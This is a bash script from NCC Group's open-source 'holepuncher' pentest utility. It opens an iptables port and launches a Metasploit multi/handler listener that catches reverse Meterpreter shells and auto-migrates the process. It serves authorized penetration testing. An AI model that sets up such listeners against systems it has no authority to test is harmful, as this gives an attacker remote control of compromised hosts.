#!/bin/bash
#
#Released as open source by NCC Group Plc - http://www.nccgroup.com/
#
#Developed by Craig S. Blackie, craig dot blackie@nccgroup dot trust
#
#https://github.com/nccgroup/holepuncher
#
#Copyright 2016 Craig S. Blackie
#
#Released under Apache V2 see LICENCE for more information
#
#Holepuncher, A wrapper script to open ports in iptables and start a listener. 



echo "Please enter jobcode:"
read jobcode
localip=$(hostname -I)
echo "Select local IP for reverse shell:"
select lhost in $localip
do
        interface="$(ip -4 address|grep $lhost|grep inet|awk '{print $NF}')"
	echo "Meterpreter shell will connect back to $lhost on interface $interface."
        break
done
error=1
while [ $error -gt 0 ]
do
        echo "Please enter port number to listen on:"
        read port
        while [ $port -lt 0 -o $port -gt 65535 ]
        do
                echo "Please enter port number between 0-65535"
                read port
        done
        options="tcp udp"
        echo "Select protocol:"
	select protocol in $options 
	do
		break        
	done
	

        if [ `fuser $port\/$protocol 2>&1 |wc -l` -gt 0 ]; then
                echo "port $port busy, please check"
                error=1
        else
                error=0
        fi
done
echo Opening  port $port\/$protocol ...
iptables -A INPUT -p $protocol --dport $port -i $interface -j ACCEPT -m comment --comment "$jobcode"
echo "Current ruleset:"
echo " "
iptables -v -L  INPUT
echo " "
echo "Please enter payload e.g. 'windows/meterpreter/reverse_https':"
read payload
echo "Setting up listener..."
echo "use exploit/multi/handler" > /tmp/$jobcode.rc
echo "set payload $payload" >> /tmp/$jobcode.rc
echo "set LHOST $lhost" >> /tmp/$jobcode.rc
echo "set LPORT $port" >> /tmp/$jobcode.rc
echo "set autorunscript post/windows/manage/migrate" >> /tmp/$jobcode.rc
echo "exploit -j" >> /tmp/$jobcode.rc 
msfconsole -q -r /tmp/$jobcode.rc
iptables -D INPUT -p $protocol --dport $port -i $interface  -j ACCEPT -m comment --comment "$jobcode"
